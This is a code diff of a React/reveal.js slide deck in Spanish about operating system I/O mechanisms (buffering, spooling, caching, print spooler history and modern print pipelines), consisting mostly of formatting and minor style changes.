@@ -17,6 +17,7 @@ import {
   Network,
   Globe,
   Server,
+  AlignCenter,
 } from "lucide-react";
 
 import "reveal.js/reveal.css";
@@ -424,9 +425,9 @@ export default function App() {
                     La gestión de entrada/salida (E/S) constituye uno de los
                     subsistemas críticos en la arquitectura de sistemas
                     operativos contemporáneos. Según{" "}
-                    <strong>Holcombe (2023)</strong>, el
-                    subsistema de E/S representa la interfaz definitiva
-                    entre el núcleo y los dispositivos periféricos.
+                    <strong>Holcombe (2023)</strong>, el subsistema de E/S
+                    representa la interfaz definitiva entre el núcleo y los
+                    dispositivos periféricos.
                   </p>
 
                   <div
@@ -729,8 +730,8 @@ export default function App() {
                         productor y consumidor.
                       </li>
                       <li>
-                        <strong>Adaptación de Tamaño:</strong> Gestiona distintos
-                        bloques de transferencia.
+                        <strong>Adaptación de Tamaño:</strong> Gestiona
+                        distintos bloques de transferencia.
                       </li>
                       <li>
                         <strong>Semántica de Copia:</strong> Protege la
@@ -761,10 +762,16 @@ export default function App() {
                         opacity: 0.6,
                       }}
                     >
-                      <span className="presenter-tag" style={{ fontSize: "0.8rem" }}>
+                      <span
+                        className="presenter-tag"
+                        style={{ fontSize: "0.8rem" }}
+                      >
                         VOLÁTIL
                       </span>
-                      <span className="presenter-tag" style={{ fontSize: "0.8rem" }}>
+                      <span
+                        className="presenter-tag"
+                        style={{ fontSize: "0.8rem" }}
+                      >
                         NANOSEGUNDOS
                       </span>
                     </div>
@@ -838,22 +845,28 @@ export default function App() {
 
               <div className="grid-2" style={{ gap: "4rem" }}>
                 <div className="glass-card" style={{ textAlign: "left" }}>
-                  <h3 style={{ color: "var(--accent-spool)", fontSize: "2.5rem" }}>
+                  <h3
+                    style={{ color: "var(--accent-spool)", fontSize: "2.5rem" }}
+                  >
                     Spooling vs Buffering
                   </h3>
                   <p
-                    style={{ fontSize: "2.2rem !important", marginTop: "1.5rem" }}
+                    style={{
+                      fontSize: "2.2rem !important",
+                      marginTop: "1.5rem",
+                    }}
                   >
-                    A diferencia del buffer, el <strong>Spooling</strong> utiliza
-                    el disco como un buffer masivo para gestionar{" "}
-                    <strong>trabajos completos</strong> destinados a dispositivos
-                    exclusivos.
+                    A diferencia del buffer, el <strong>Spooling</strong>{" "}
+                    utiliza el disco como un buffer masivo para gestionar{" "}
+                    <strong>trabajos completos</strong> destinados a
+                    dispositivos exclusivos.
                   </p>
                   <div
                     className="technical-note"
                     style={{
                       borderColor: "var(--accent-spool)",
                       background: "rgba(222, 186, 135, 0.05)",
+                      fontSize: "1.8rem",
                     }}
                   >
                     <strong>Persistencia:</strong> Sobrevive a fallos de energía
@@ -862,17 +875,20 @@ export default function App() {
                 </div>
 
                 <div
-                  style={{ display: "flex", flexDirection: "column", gap: "1.5rem" }}
+                  style={{
+                    display: "flex",
+                    flexDirection: "column",
+                    gap: "2.5rem",
+                  }}
                 >
-                  <div className="metric-card">
-                    <span className="metric-label">
-                      Componentes (Microsoft Learn)
-                    </span>
+                  <div className="glass-card">
+                    <h4>Componentes (Microsoft Learn)</h4>
                     <div
                       style={{
                         marginTop: "1rem",
                         display: "flex",
                         flexDirection: "column",
+                        alignItems: "center",
                         gap: "0.5rem",
                       }}
                     >
@@ -896,38 +912,123 @@ export default function App() {
         <Stack>
           <Slide data-transition="zoom">
             <div style={{ padding: "0 8%" }}>
-              <div className="glass-card" style={{ borderLeft: "12px solid var(--accent-cache)" }}>
-                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "3rem" }}>
+              <div
+                className="glass-card"
+                style={{ borderLeft: "12px solid var(--accent-cache)" }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    justifyContent: "space-between",
+                    alignItems: "center",
+                    marginBottom: "3rem",
+                  }}
+                >
                   <div>
-                    <span className="presenter-tag" style={{ background: "rgba(183,204,133,0.1)", color: "var(--accent-cache)" }}>
+                    <span
+                      className="presenter-tag"
+                      style={{
+                        background: "rgba(183,204,133,0.1)",
+                        color: "var(--accent-cache)",
+                      }}
+                    >
                       MECANISMO 03 // CACHING
                     </span>
-                    <h2 style={{ fontSize: "5rem", marginTop: "0.5rem" }}>Localidad de Referencia</h2>
+                    <h2 style={{ fontSize: "5rem", marginTop: "0.5rem" }}>
+                      Localidad de Referencia
+                    </h2>
                   </div>
-                  <Activity size={80} color="var(--accent-cache)" style={{ opacity: 0.2 }} />
+                  <Activity
+                    size={80}
+                    color="var(--accent-cache)"
+                    style={{ opacity: 0.2 }}
+                  />
                 </div>
 
                 <div className="grid-2" style={{ gap: "4rem" }}>
                   <div style={{ textAlign: "left" }}>
-                    <h4 style={{ color: "var(--accent-cache)", fontSize: "2.5rem", marginBottom: "2rem" }}>
+                    <h4
+                      style={{
+                        color: "var(--accent-cache)",
+                        fontSize: "2.5rem",
+                        marginBottom: "2rem",
+                      }}
+                    >
                       Dos Principios Fundamentales:
                     </h4>
-                    <ul style={{ display: "flex", flexDirection: "column", gap: "1.5rem" }}>
-                      <li><strong>Localidad Temporal:</strong> Un dato accedido recientemente probablemente se accederá de nuevo pronto. La caché lo retiene en memoria rápida.</li>
-                      <li><strong>Localidad Espacial:</strong> Los datos cercanos en dirección a un dato accedido también serán probablemente accedidos. Se cargan bloques completos, no bytes individuales.</li>
+                    <ul
+                      style={{
+                        display: "flex",
+                        flexDirection: "column",
+                        gap: "1.5rem",
+                      }}
+                    >
+                      <li>
+                        <strong>Localidad Temporal:</strong> Un dato accedido
+                        recientemente probablemente se accederá de nuevo pronto.
+                        La caché lo retiene en memoria rápida.
+                      </li>
+                      <li>
+                        <strong>Localidad Espacial:</strong> Los datos cercanos
+                        en dirección a un dato accedido también serán
+                        probablemente accedidos. Se cargan bloques completos, no
+                        bytes individuales.
+                      </li>
                     </ul>
                   </div>
-                  <div className="metric-card" style={{ background: "rgba(255,255,255,0.02)" }}>
-                    <p style={{ fontSize: "2rem !important", fontStyle: "italic", borderLeft: "4px solid var(--accent-gold)", paddingLeft: "1.5rem" }}>
-                      "Una caché es una copia de un dato que ya existe en otro lugar, mantenida en un medio más rápido para reducir la latencia de acceso."
+                  <div
+                    className="metric-card"
+                    style={{ background: "rgba(255,255,255,0.02)" }}
+                  >
+                    <p
+                      style={{
+                        fontSize: "2rem !important",
+                        fontStyle: "italic",
+                        borderLeft: "4px solid var(--accent-gold)",
+                        paddingLeft: "1.5rem",
+                      }}
+                    >
+                      "Una caché es una copia de un dato que ya existe en otro
+                      lugar, mantenida en un medio más rápido para reducir la
+                      latencia de acceso."
                     </p>
-                    <div style={{ marginTop: "2rem", display: "flex", gap: "1rem", flexWrap: "wrap" }}>
-                      <span className="presenter-tag" style={{ fontSize: "0.8rem" }}>HIT RATE</span>
-                      <span className="presenter-tag" style={{ fontSize: "0.8rem" }}>MISS PENALTY</span>
-                      <span className="presenter-tag" style={{ fontSize: "0.8rem" }}>COLD START</span>
+                    <div
+                      style={{
+                        marginTop: "2rem",
+                        display: "flex",
+                        gap: "1rem",
+                        flexWrap: "wrap",
+                      }}
+                    >
+                      <span
+                        className="presenter-tag"
+                        style={{ fontSize: "0.8rem" }}
+                      >
+                        HIT RATE
+                      </span>
+                      <span
+                        className="presenter-tag"
+                        style={{ fontSize: "0.8rem" }}
+                      >
+                        MISS PENALTY
+                      </span>
+                      <span
+                        className="presenter-tag"
+                        style={{ fontSize: "0.8rem" }}
+                      >
+                        COLD START
+                      </span>
                     </div>
-                    <div className="technical-note" style={{ marginTop: "1.5rem", borderColor: "var(--accent-cache)" }}>
-                      <strong>Diferencia clave con Buffer:</strong> el buffer es el único lugar del dato durante la transferencia. La caché es una copia — el original sigue existiendo en disco.
+                    <div
+                      className="technical-note"
+                      style={{
+                        marginTop: "1.5rem",
+                        borderColor: "var(--accent-cache)",
+                      }}
+                    >
+                      <strong>Diferencia clave con Buffer:</strong> el buffer es
+                      el único lugar del dato durante la transferencia. La caché
+                      es una copia — el original sigue existiendo en disco.
                     </div>
                   </div>
                 </div>
@@ -937,16 +1038,24 @@ export default function App() {
         </Stack>
 
         {/* ── MATRIZ COMPARATIVA ── */}
-        <Slide 
-          data-background-iframe="./comparativa.html" 
+        <Slide
+          data-background-iframe="./comparativa.html"
           data-background-interactive
           data-transition="fade"
-        >
-        </Slide>
+        ></Slide>
 
         {/* ── ESCENARIOS DE APLICACIÓN ── */}
         <Slide data-transition="convex">
-          <div style={{ padding: "0 5%", textAlign: "left", height: "100%", display: "flex", flexDirection: "column", justifyContent: "center" }}>
+          <div
+            style={{
+              padding: "0 5%",
+              textAlign: "left",
+              height: "100%",
+              display: "flex",
+              flexDirection: "column",
+              justifyContent: "center",
+            }}
+          >
             <div style={{ marginBottom: "2rem" }}>
               <span
                 style={{
@@ -962,37 +1071,187 @@ export default function App() {
                 Escenarios de Aplicación
               </h2>
             </div>
-            <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "1rem", alignItems: "stretch", width: "100%", boxSizing: "border-box" }}>
-              <div className="glass-card" style={{ padding: "1.5rem", borderTop: "6px solid var(--accent-buf)", display: "flex", flexDirection: "column", height: "100%", minWidth: 0, boxSizing: "border-box" }}>
-                <div style={{ display: "flex", alignItems: "center", gap: "0.8rem", marginBottom: "1rem" }}>
+            <div
+              style={{
+                display: "grid",
+                gridTemplateColumns: "repeat(3, 1fr)",
+                gap: "1rem",
+                alignItems: "stretch",
+                width: "100%",
+                boxSizing: "border-box",
+              }}
+            >
+              <div
+                className="glass-card"
+                style={{
+                  padding: "1.5rem",
+                  borderTop: "6px solid var(--accent-buf)",
+                  display: "flex",
+                  flexDirection: "column",
+                  height: "100%",
+                  minWidth: 0,
+                  boxSizing: "border-box",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    gap: "0.8rem",
+                    marginBottom: "1rem",
+                  }}
+                >
                   <Zap size={24} color="var(--accent-buf)" />
-                  <h3 style={{ fontSize: "1.6rem", margin: 0, color: "var(--accent-buf)" }}>Buffering</h3>
+                  <h3
+                    style={{
+                      fontSize: "1.6rem",
+                      margin: 0,
+                      color: "var(--accent-buf)",
+                    }}
+                  >
+                    Buffering
+                  </h3>
                 </div>
-                <ul style={{ display: "flex", flexDirection: "column", gap: "0.6rem", fontSize: "1.2rem !important", textAlign: "left", margin: 0, paddingLeft: "1.1rem", flexGrow: 1, overflowWrap: "anywhere", wordBreak: "normal" }}>
-                  <li style={{ lineHeight: 1.3, listStyle: "none" }}><span style={{ color: "var(--accent-buf)" }}>•</span> <strong>Streaming:</strong> Precarga en RAM para compensar jitter (QoS).</li>
-                  <li style={{ lineHeight: 1.3, listStyle: "none" }}><span style={{ color: "var(--accent-buf)" }}>•</span> <strong>Redes:</strong> Gestión de colas activas y control de congestión.</li>
+                <ul
+                  style={{
+                    display: "flex",
+                    flexDirection: "column",
+                    gap: "0.6rem",
+                    fontSize: "1.2rem !important",
+                    textAlign: "left",
+                    margin: 0,
+                    paddingLeft: "1.1rem",
+                    flexGrow: 1,
+                    overflowWrap: "anywhere",
+                    wordBreak: "normal",
+                  }}
+                >
+                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
+                    <span style={{ color: "var(--accent-buf)" }}>•</span>{" "}
+                    <strong>Streaming:</strong> Precarga en RAM para compensar
+                    jitter (QoS).
+                  </li>
+                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
+                    <span style={{ color: "var(--accent-buf)" }}>•</span>{" "}
+                    <strong>Redes:</strong> Gestión de colas activas y control
+                    de congestión.
+                  </li>
                 </ul>
               </div>
 
-              <div className="glass-card" style={{ padding: "1.5rem", borderTop: "6px solid var(--accent-spool)", display: "flex", flexDirection: "column", height: "100%", minWidth: 0, boxSizing: "border-box" }}>
-                <div style={{ display: "flex", alignItems: "center", gap: "0.8rem", marginBottom: "1rem" }}>
+              <div
+                className="glass-card"
+                style={{
+                  padding: "1.5rem",
+                  borderTop: "6px solid var(--accent-spool)",
+                  display: "flex",
+                  flexDirection: "column",
+                  height: "100%",
+                  minWidth: 0,
+                  boxSizing: "border-box",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    gap: "0.8rem",
+                    marginBottom: "1rem",
+                  }}
+                >
                   <RotateCcw size={24} color="var(--accent-spool)" />
-                  <h3 style={{ fontSize: "1.6rem", margin: 0, color: "var(--accent-spool)" }}>Spooling</h3>
+                  <h3
+                    style={{
+                      fontSize: "1.6rem",
+                      margin: 0,
+                      color: "var(--accent-spool)",
+                    }}
+                  >
+                    Spooling
+                  </h3>
                 </div>
-                <ul style={{ display: "flex", flexDirection: "column", gap: "0.6rem", fontSize: "1.2rem !important", textAlign: "left", margin: 0, paddingLeft: "1.1rem", flexGrow: 1, overflowWrap: "anywhere", wordBreak: "normal" }}>
-                  <li style={{ lineHeight: 1.3, listStyle: "none" }}><span style={{ color: "var(--accent-spool)" }}>•</span> <strong>Impresión:</strong> Interceptación a disco para serializar trabajos.</li>
-                  <li style={{ lineHeight: 1.3, listStyle: "none" }}><span style={{ color: "var(--accent-spool)" }}>•</span> <strong>Lotes:</strong> Colas masivas asíncronas sin bloqueo de procesos.</li>
+                <ul
+                  style={{
+                    display: "flex",
+                    flexDirection: "column",
+                    gap: "0.6rem",
+                    fontSize: "1.2rem !important",
+                    textAlign: "left",
+                    margin: 0,
+                    paddingLeft: "1.1rem",
+                    flexGrow: 1,
+                    overflowWrap: "anywhere",
+                    wordBreak: "normal",
+                  }}
+                >
+                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
+                    <span style={{ color: "var(--accent-spool)" }}>•</span>{" "}
+                    <strong>Impresión:</strong> Interceptación a disco para
+                    serializar trabajos.
+                  </li>
+                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
+                    <span style={{ color: "var(--accent-spool)" }}>•</span>{" "}
+                    <strong>Lotes:</strong> Colas masivas asíncronas sin bloqueo
+                    de procesos.
+                  </li>
                 </ul>
               </div>
 
-              <div className="glass-card" style={{ padding: "1.5rem", borderTop: "6px solid var(--accent-cache)", display: "flex", flexDirection: "column", height: "100%", minWidth: 0, boxSizing: "border-box" }}>
-                <div style={{ display: "flex", alignItems: "center", gap: "0.8rem", marginBottom: "1rem" }}>
+              <div
+                className="glass-card"
+                style={{
+                  padding: "1.5rem",
+                  borderTop: "6px solid var(--accent-cache)",
+                  display: "flex",
+                  flexDirection: "column",
+                  height: "100%",
+                  minWidth: 0,
+                  boxSizing: "border-box",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    gap: "0.8rem",
+                    marginBottom: "1rem",
+                  }}
+                >
                   <Activity size={24} color="var(--accent-cache)" />
-                  <h3 style={{ fontSize: "1.6rem", margin: 0, color: "var(--accent-cache)" }}>Caching</h3>
+                  <h3
+                    style={{
+                      fontSize: "1.6rem",
+                      margin: 0,
+                      color: "var(--accent-cache)",
+                    }}
+                  >
+                    Caching
+                  </h3>
                 </div>
-                <ul style={{ display: "flex", flexDirection: "column", gap: "0.6rem", fontSize: "1.2rem !important", textAlign: "left", margin: 0, paddingLeft: "1.1rem", flexGrow: 1, overflowWrap: "anywhere", wordBreak: "normal" }}>
-                  <li style={{ lineHeight: 1.3, listStyle: "none" }}><span style={{ color: "var(--accent-cache)" }}>•</span> <strong>FS:</strong> Buffer caché en ext4/Btrfs (LRU adaptativo).</li>
-                  <li style={{ lineHeight: 1.3, listStyle: "none" }}><span style={{ color: "var(--accent-cache)" }}>•</span> <strong>NVMe:</strong> Migración de cuellos de botella al Kernel.</li>
+                <ul
+                  style={{
+                    display: "flex",
+                    flexDirection: "column",
+                    gap: "0.6rem",
+                    fontSize: "1.2rem !important",
+                    textAlign: "left",
+                    margin: 0,
+                    paddingLeft: "1.1rem",
+                    flexGrow: 1,
+                    overflowWrap: "anywhere",
+                    wordBreak: "normal",
+                  }}
+                >
+                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
+                    <span style={{ color: "var(--accent-cache)" }}>•</span>{" "}
+                    <strong>FS:</strong> Buffer caché en ext4/Btrfs (LRU
+                    adaptativo).
+                  </li>
+                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
+                    <span style={{ color: "var(--accent-cache)" }}>•</span>{" "}
+                    <strong>NVMe:</strong> Migración de cuellos de botella al
+                    Kernel.
+                  </li>
                 </ul>
               </div>
             </div>
@@ -1004,10 +1263,24 @@ export default function App() {
           {/* Historia de la impresión */}
           <Slide data-transition="zoom">
             <div style={{ padding: "0 8%", textAlign: "left" }}>
-              <div style={{ display: "flex", alignItems: "center", gap: "2rem", marginBottom: "3rem" }}>
+              <div
+                style={{
+                  display: "flex",
+                  alignItems: "center",
+                  gap: "2rem",
+                  marginBottom: "3rem",
+                }}
+              >
                 <Printer size={55} color="var(--accent-spool)" />
                 <div>
-                  <span style={{ fontFamily: "var(--mono)", fontSize: "1.1rem", color: "var(--accent-spool)", letterSpacing: "0.2em" }}>
+                  <span
+                    style={{
+                      fontFamily: "var(--mono)",
+                      fontSize: "1.1rem",
+                      color: "var(--accent-spool)",
+                      letterSpacing: "0.2em",
+                    }}
+                  >
                     EVOLUCIÓN HISTÓRICA
                   </span>
                   <h2 style={{ fontSize: "4.5rem", margin: 0 }}>
@@ -1016,33 +1289,97 @@ export default function App() {
                 </div>
               </div>
 
-              <div style={{ display: "flex", flexDirection: "column", gap: "1.5rem" }}>
+              <div
+                style={{
+                  display: "flex",
+                  flexDirection: "column",
+                  gap: "1.5rem",
+                }}
+              >
                 <div className="timeline-item">
-                  <div className="timeline-dot" style={{ background: "var(--accent-red)" }}></div>
+                  <div
+                    className="timeline-dot"
+                    style={{ background: "var(--accent-red)" }}
+                  ></div>
                   <div>
-                    <span className="era-badge" style={{ background: "rgba(203,124,148,0.15)", color: "var(--accent-red)" }}>1950s — MAINFRAMES</span>
-                    <p style={{ fontSize: "1.8rem !important", margin: "0.5rem 0 0 0" }}>
-                      <strong>Acceso exclusivo y directo.</strong> Un proceso monopolizaba la impresora de línea durante toda la ejecución. Si el trabajo tardaba horas, la máquina completa esperaba. No existía multiprogramación real.
+                    <span
+                      className="era-badge"
+                      style={{
+                        background: "rgba(203,124,148,0.15)",
+                        color: "var(--accent-red)",
+                      }}
+                    >
+                      1950s — MAINFRAMES
+                    </span>
+                    <p
+                      style={{
+                        fontSize: "1.8rem !important",
+                        margin: "0.5rem 0 0 0",
+                      }}
+                    >
+                      <strong>Acceso exclusivo y directo.</strong> Un proceso
+                      monopolizaba la impresora de línea durante toda la
+                      ejecución. Si el trabajo tardaba horas, la máquina
+                      completa esperaba. No existía multiprogramación real.
                     </p>
                   </div>
                 </div>
 
                 <div className="timeline-item">
-                  <div className="timeline-dot" style={{ background: "var(--accent-gold)" }}></div>
+                  <div
+                    className="timeline-dot"
+                    style={{ background: "var(--accent-gold)" }}
+                  ></div>
                   <div>
-                    <span className="era-badge" style={{ background: "rgba(224,193,90,0.15)", color: "var(--accent-gold)" }}>1960s — BATCH PRIMITIVO</span>
-                    <p style={{ fontSize: "1.8rem !important", margin: "0.5rem 0 0 0" }}>
-                      Se introdujeron <strong>operadores humanos</strong> como intermediarios: recibían tarjetas perforadas, las agrupaban, y las entregaban físicamente a la impresora. El "spool" era una <em>cinta magnética</em> física.
+                    <span
+                      className="era-badge"
+                      style={{
+                        background: "rgba(224,193,90,0.15)",
+                        color: "var(--accent-gold)",
+                      }}
+                    >
+                      1960s — BATCH PRIMITIVO
+                    </span>
+                    <p
+                      style={{
+                        fontSize: "1.8rem !important",
+                        margin: "0.5rem 0 0 0",
+                      }}
+                    >
+                      Se introdujeron <strong>operadores humanos</strong> como
+                      intermediarios: recibían tarjetas perforadas, las
+                      agrupaban, y las entregaban físicamente a la impresora. El
+                      "spool" era una <em>cinta magnética</em> física.
                     </p>
                   </div>
                 </div>
 
                 <div className="timeline-item">
-                  <div className="timeline-dot" style={{ background: "var(--accent-buf)" }}></div>
+                  <div
+                    className="timeline-dot"
+                    style={{ background: "var(--accent-buf)" }}
+                  ></div>
                   <div>
-                    <span className="era-badge" style={{ background: "rgba(127,180,202,0.15)", color: "var(--accent-buf)" }}>1965 — OS/360 IBM</span>
-                    <p style={{ fontSize: "1.8rem !important", margin: "0.5rem 0 0 0" }}>
-                      IBM introduce el <strong>primer spooling de software</strong>: los trabajos se escriben a disco mientras otro imprime. Se eliminan los cuellos de botella manuales. Nace la multiprogramación moderna.
+                    <span
+                      className="era-badge"
+                      style={{
+                        background: "rgba(127,180,202,0.15)",
+                        color: "var(--accent-buf)",
+                      }}
+                    >
+                      1965 — OS/360 IBM
+                    </span>
+                    <p
+                      style={{
+                        fontSize: "1.8rem !important",
+                        margin: "0.5rem 0 0 0",
+                      }}
+                    >
+                      IBM introduce el{" "}
+                      <strong>primer spooling de software</strong>: los trabajos
+                      se escriben a disco mientras otro imprime. Se eliminan los
+                      cuellos de botella manuales. Nace la multiprogramación
+                      moderna.
                     </p>
                   </div>
                 </div>
@@ -1054,7 +1391,14 @@ export default function App() {
           <Slide data-transition="slide-in fade-out">
             <div style={{ padding: "0 8%", textAlign: "left" }}>
               <div style={{ marginBottom: "3rem" }}>
-                <span style={{ fontFamily: "var(--mono)", fontSize: "1.1rem", color: "var(--accent-cache)", letterSpacing: "0.2em" }}>
+                <span
+                  style={{
+                    fontFamily: "var(--mono)",
+                    fontSize: "1.1rem",
+                    color: "var(--accent-cache)",
+                    letterSpacing: "0.2em",
+                  }}
+                >
                   ESTADO DEL ARTE
                 </span>
                 <h2 style={{ fontSize: "4.5rem", margin: "0.5rem 0 0 0" }}>
@@ -1063,35 +1407,141 @@ export default function App() {
               </div>
 
               <div className="grid-2" style={{ gap: "4rem" }}>
-                <div style={{ display: "flex", flexDirection: "column", gap: "2rem" }}>
-                  <div className="metric-card" style={{ borderLeft: "4px solid var(--accent-cache)" }}>
-                    <h4 style={{ color: "var(--accent-cache)", fontSize: "2rem", marginBottom: "1rem" }}>CUPS (Linux/macOS)</h4>
+                <div
+                  style={{
+                    display: "flex",
+                    flexDirection: "column",
+                    gap: "2rem",
+                  }}
+                >
+                  <div
+                    className="metric-card"
+                    style={{ borderLeft: "4px solid var(--accent-cache)" }}
+                  >
+                    <h4
+                      style={{
+                        color: "var(--accent-cache)",
+                        fontSize: "2rem",
+                        marginBottom: "1rem",
+                      }}
+                    >
+                      CUPS (Linux/macOS)
+                    </h4>
                     <p style={{ fontSize: "1.7rem !important", margin: 0 }}>
-                      <strong>Common Unix Printing System</strong>: servidor de impresión basado en IPP (Internet Printing Protocol). Cada trabajo genera un archivo en <code>/var/spool/cups/</code>. El scheduler IPP gestiona prioridades, reintentos y colas por red.
+                      <strong>Common Unix Printing System</strong>: servidor de
+                      impresión basado en IPP (Internet Printing Protocol). Cada
+                      trabajo genera un archivo en <code>/var/spool/cups/</code>
+                      . El scheduler IPP gestiona prioridades, reintentos y
+                      colas por red.
                     </p>
                   </div>
-                  <div className="metric-card" style={{ borderLeft: "4px solid var(--accent-spool)" }}>
-                    <h4 style={{ color: "var(--accent-spool)", fontSize: "2rem", marginBottom: "1rem" }}>Windows Print System Remoting</h4>
+                  <div
+                    className="metric-card"
+                    style={{ borderLeft: "4px solid var(--accent-spool)" }}
+                  >
+                    <h4
+                      style={{
+                        color: "var(--accent-spool)",
+                        fontSize: "2rem",
+                        marginBottom: "1rem",
+                      }}
+                    >
+                      Windows Print System Remoting
+                    </h4>
                     <p style={{ fontSize: "1.7rem !important", margin: 0 }}>
-                      <strong>spoolsv.exe</strong> orquesta drivers en espacio de usuario (post-PrintNightmare). Soporte nativo para <strong>XPS/OpenXPS</strong> que reemplaza el pipeline GDI clásico, eliminando conversiones EMF→PCL intermedias.
+                      <strong>spoolsv.exe</strong> orquesta drivers en espacio
+                      de usuario (post-PrintNightmare). Soporte nativo para{" "}
+                      <strong>XPS/OpenXPS</strong> que reemplaza el pipeline GDI
+                      clásico, eliminando conversiones EMF→PCL intermedias.
                     </p>
                   </div>
                 </div>
 
                 <div className="glass-card" style={{ padding: "3rem" }}>
-                  <h4 style={{ fontSize: "2.2rem", color: "var(--accent-gold)", marginBottom: "2rem" }}>Pipeline de Impresión Actual</h4>
-                  <div style={{ display: "flex", flexDirection: "column", gap: "1rem" }}>
+                  <h4
+                    style={{
+                      fontSize: "2.2rem",
+                      color: "var(--accent-gold)",
+                      marginBottom: "2rem",
+                    }}
+                  >
+                    Pipeline de Impresión Actual
+                  </h4>
+                  <div
+                    style={{
+                      display: "flex",
+                      flexDirection: "column",
+                      gap: "1rem",
+                    }}
+                  >
                     {[
-                      { step: "01", label: "App genera documento", detail: "PDF / XPS / PostScript", color: "var(--accent-buf)" },
-                      { step: "02", label: "Spooler intercepta", detail: "Escribe en /spool, libera la app", color: "var(--accent-spool)" },
-                      { step: "03", label: "Procesador de impresión", detail: "Convierte al lenguaje del driver (PCL6, IPP Everywhere)", color: "var(--accent-gold)" },
-                      { step: "04", label: "Monitor de puerto", detail: "Envía por USB / TCP/IP / SMB", color: "var(--accent-cache)" },
+                      {
+                        step: "01",
+                        label: "App genera documento",
+                        detail: "PDF / XPS / PostScript",
+                        color: "var(--accent-buf)",
+                      },
+                      {
+                        step: "02",
+                        label: "Spooler intercepta",
+                        detail: "Escribe en /spool, libera la app",
+                        color: "var(--accent-spool)",
+                      },
+                      {
+                        step: "03",
+                        label: "Procesador de impresión",
+                        detail:
+                          "Convierte al lenguaje del driver (PCL6, IPP Everywhere)",
+                        color: "var(--accent-gold)",
+                      },
+                      {
+                        step: "04",
+                        label: "Monitor de puerto",
+                        detail: "Envía por USB / TCP/IP / SMB",
+                        color: "var(--accent-cache)",
+                      },
                     ].map((item) => (
-                      <div key={item.step} style={{ display: "flex", gap: "1.5rem", alignItems: "center", padding: "0.8rem", borderRadius: "12px", background: "rgba(255,255,255,0.03)" }}>
-                        <span style={{ fontFamily: "var(--mono)", color: item.color, fontWeight: 800, fontSize: "1.3rem", minWidth: "2.5rem" }}>{item.step}</span>
+                      <div
+                        key={item.step}
+                        style={{
+                          display: "flex",
+                          gap: "1.5rem",
+                          alignItems: "center",
+                          padding: "0.8rem",
+                          borderRadius: "12px",
+                          background: "rgba(255,255,255,0.03)",
+                        }}
+                      >
+                        <span
+                          style={{
+                            fontFamily: "var(--mono)",
+                            color: item.color,
+                            fontWeight: 800,
+                            fontSize: "1.3rem",
+                            minWidth: "2.5rem",
+                          }}
+                        >
+                          {item.step}
+                        </span>
                         <div>
-                          <div style={{ fontSize: "1.6rem", fontWeight: 700, color: "var(--fg)" }}>{item.label}</div>
-                          <div style={{ fontSize: "1.2rem", color: "var(--subtext)", fontFamily: "var(--mono)" }}>{item.detail}</div>
+                          <div
+                            style={{
+                              fontSize: "1.6rem",
+                              fontWeight: 700,
+                              color: "var(--fg)",
+                            }}
+                          >
+                            {item.label}
+                          </div>
+                          <div
+                            style={{
+                              fontSize: "1.2rem",
+                              color: "var(--subtext)",
+                              fontFamily: "var(--mono)",
+                            }}
+                          >
+                            {item.detail}
+                          </div>
                         </div>
                       </div>
                     ))}
@@ -1106,30 +1556,122 @@ export default function App() {
         <Stack>
           <Slide data-transition="zoom">
             <div style={{ padding: "0 8%", textAlign: "left" }}>
-              <div style={{ display: "flex", alignItems: "center", gap: "2rem", marginBottom: "3rem" }}>
+              <div
+                style={{
+                  display: "flex",
+                  alignItems: "center",
+                  gap: "2rem",
+                  marginBottom: "3rem",
+                }}
+              >
                 <RotateCcw size={50} color="var(--accent-spool)" />
-                <h2 style={{ fontSize: "4.5rem", margin: 0 }}>Análisis Crítico: Spooling</h2>
+                <h2 style={{ fontSize: "4.5rem", margin: 0 }}>
+                  Análisis Crítico: Spooling
+                </h2>
               </div>
               <div className="grid-2">
-                <div style={{ display: "flex", flexDirection: "column", gap: "2rem" }}>
-                  <div className="metric-card" style={{ borderLeft: "4px solid var(--accent-spool)" }}>
-                    <h4 style={{ fontSize: "1.8rem", color: "var(--fg)", marginBottom: "0.5rem" }}>1. Exclusividad y Serialización</h4>
-                    <p style={{ fontSize: "1.5rem !important", margin: 0, opacity: 0.8 }}>Almacena trabajos completos en disco y los entrega secuencialmente (FIFO), garantizando procesamiento atómico sin intercalar páginas.</p>
+                <div
+                  style={{
+                    display: "flex",
+                    flexDirection: "column",
+                    gap: "2rem",
+                  }}
+                >
+                  <div
+                    className="metric-card"
+                    style={{ borderLeft: "4px solid var(--accent-spool)" }}
+                  >
+                    <h4
+                      style={{
+                        fontSize: "1.8rem",
+                        color: "var(--fg)",
+                        marginBottom: "0.5rem",
+                      }}
+                    >
+                      1. Exclusividad y Serialización
+                    </h4>
+                    <p
+                      style={{
+                        fontSize: "1.5rem !important",
+                        margin: 0,
+                        opacity: 0.8,
+                      }}
+                    >
+                      Almacena trabajos completos en disco y los entrega
+                      secuencialmente (FIFO), garantizando procesamiento atómico
+                      sin intercalar páginas.
+                    </p>
                   </div>
-                  <div className="metric-card" style={{ borderLeft: "4px solid var(--accent-buf)" }}>
-                    <h4 style={{ fontSize: "1.8rem", color: "var(--fg)", marginBottom: "0.5rem" }}>2. Multiprogramación Real</h4>
-                    <p style={{ fontSize: "1.5rem !important", margin: 0, opacity: 0.8 }}>Libera el proceso usuario inmediatamente. El spooler opera como un servicio de sistema independiente (segundo plano).</p>
+                  <div
+                    className="metric-card"
+                    style={{ borderLeft: "4px solid var(--accent-buf)" }}
+                  >
+                    <h4
+                      style={{
+                        fontSize: "1.8rem",
+                        color: "var(--fg)",
+                        marginBottom: "0.5rem",
+                      }}
+                    >
+                      2. Multiprogramación Real
+                    </h4>
+                    <p
+                      style={{
+                        fontSize: "1.5rem !important",
+                        margin: 0,
+                        opacity: 0.8,
+                      }}
+                    >
+                      Libera el proceso usuario inmediatamente. El spooler opera
+                      como un servicio de sistema independiente (segundo plano).
